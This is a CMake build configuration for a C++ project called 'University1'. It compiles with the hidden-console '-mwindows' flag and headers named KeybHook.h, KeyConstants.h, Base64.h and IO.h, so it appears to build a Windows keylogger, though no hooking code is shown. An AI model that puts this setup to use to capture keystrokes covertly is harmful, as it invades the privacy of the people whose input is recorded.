cmake_minimum_required(VERSION 3.15)
project(University1)

set(CMAKE_CXX_STANDARD 14)
set(GCC_COVERAGE_COMPILE_FLAGS "-mwindows")
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} ${GCC_COVERAGE_COMPILE_FLAGS}" )

add_executable(University1 main.cpp KeyConstants.h Helper.h Base64.h IO.h KeybHook.h)

